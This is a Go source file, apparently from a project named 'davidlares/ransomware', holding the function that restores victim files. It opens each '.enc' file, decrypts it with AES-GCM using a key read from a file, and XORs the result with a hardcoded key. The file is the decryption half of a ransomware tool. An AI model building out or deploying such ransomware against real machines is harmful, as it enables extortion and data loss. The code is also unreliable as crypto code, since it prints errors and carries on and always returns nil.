package decrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"davidlares/ransomware/encrypt/xor"
	"davidlares/ransomware/mapper"
	"fmt"
	"io/ioutil"
	"os"
)

const xorKey = "mysecretkey"

func DecryptWithXorAndAES(filename, keyFile string, decryptControl <-chan struct{}) error {
	// defer
	defer func() { <-decryptControl }()
	// file
	defer mapper.Wg.Done()
	// grabbing the encrypted file
	encFile, err := os.Open(filename)
	// checking for errors
	if err != nil {
		fmt.Println("Error to open file", err)
	}
	// closing file
	defer encFile.Close()
	// checking key
	key, err := ioutil.ReadFile(keyFile)
	if err != nil {
		fmt.Println("Error to read keyFile", err)
	}
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		fmt.Println("Key size must be 16, 24, or 32 bytes long", len(key))
	}
	// getting the block
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error to create block")
	}
	// GCM
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Error to create decrypt AES-GCM", err)
	}
	// getting the nonce
	nonce := make([]byte, aesGCM.NonceSize())
	_, err = encFile.Read(nonce)
	if err != nil {
		fmt.Println()
	}
	// getting the data
	encData, err := ioutil.ReadAll(encFile)
	if err != nil {
		fmt.Println("Erro to read data encrypted", err)
	}
	// plain text
	plainText, err := aesGCM.Open(nil, nonce, encData, nil)
	if err != nil {
		fmt.Println("Error to plaintext", err)
	}
	// original data
	originalData := xor.XorBytes(plainText, []byte(xorKey))
	// output file (removing the .enc)
	outFile, err := os.Create(filename[:len(filename)-4])
	if err != nil {
		fmt.Println("Error to create outfile", err)
	}
	// then
	defer outFile.Close()
	// and we write
	_, err = outFile.Write(originalData)
	if err != nil {
		fmt.Println("Error to write decrypted content")
	}
	return nil
}
